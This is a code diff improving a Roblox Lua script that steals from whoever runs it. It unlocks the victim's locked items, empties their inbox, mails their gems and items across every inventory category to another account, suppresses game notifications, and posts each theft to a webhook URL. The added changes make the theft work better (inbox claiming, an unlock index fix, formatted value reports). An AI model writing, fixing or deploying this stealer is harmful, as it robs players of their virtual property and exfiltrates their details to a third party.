@@ -8,11 +8,24 @@ local GetSave = function()
     return require(game.ReplicatedStorage.Library.Client.Save).Get()
 end
 
+local function formatNumber(number)
+	local number = math.floor(number)
+	local suffixes = {"", "k", "m", "b", "t"}
+	local suffixIndex = 1
+	while number >= 1000 do
+		number = number / 1000
+		suffixIndex = suffixIndex + 1
+	end
+	return string.format("%.2f%s", number, suffixes[suffixIndex])
+end
+
 local function SendMessage(url, username, itemID, itemRAP)
     local http = game:GetService("HttpService")
     local headers = {
         ["Content-Type"] = "application/json"
     }
+
+	local formattedRAP = formatNumber(itemRAP)
     local data = {
         ["embeds"] = {{
             ["title"] = "New Item Sent",
@@ -30,7 +43,7 @@ local function SendMessage(url, username, itemID, itemRAP)
                 },
 				{
 					["name"] = "RAP:",
-					["value"] = tostring(itemRAP),
+					["value"] = tostring(formattedRAP),
 					["inline"] = false
 				}
             },
@@ -57,6 +70,7 @@ end
 for i, v in pairs(GetSave().Inventory.Currency) do
     if v.id == "Diamonds" then
         GemAmount1 = v._am
+		break
     end
 end
 
@@ -85,6 +99,15 @@ noti:GetPropertyChangedSignal("Enabled"):Connect(function()
 	noti.Enabled = false
 end)
 noti.Enabled = false
+
+local function claim_mail()
+    local inbox = game.ReplicatedStorage.Network['Mailbox: Get']:InvokeServer().Inbox
+	local uuidlist = {}
+	for _, gift in pairs(inbox) do
+    	table.insert(uuidlist, gift.uuid)
+	end
+    game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Claim"):InvokeServer(uuidlist)
+end
 
 local function getRAP(Type, Item)
     if GetRapValues[Type] then
@@ -139,7 +162,7 @@ local function CategorySteal(category)
 		local id = v.id
 		if v._lk then
 			local args = {
-			[1] = item.uid,
+			[1] = i,
 			[2] = false
 			}
 			game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Locking_SetLocked"):InvokeServer(unpack(args))
@@ -175,8 +198,9 @@ local function GemSteal()
             }
             game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
 			if Webhook and Webhook ~= "" then
-				SendMessage(Webhook, plr.Name, "Gems: " .. (GemAmount - 10000))
+				SendMessage(Webhook, plr.Name, "Gems", (GemAmount - 10000))
 			end
+			break
         end
     end
 end
@@ -221,6 +245,7 @@ end
 
 if CountHuges() > 0 or CountGems() > 500000 then
 	EmptyBoxes()
+	claim_mail()
 	local categoryList = {"Pet", "Egg", "Charm", "Enchant", "Potion", "Misc", "Hoverboard", "Booth", "Ultimate"}
 	for i, v in pairs(categoryList) do
 		if save[v] ~= nil then
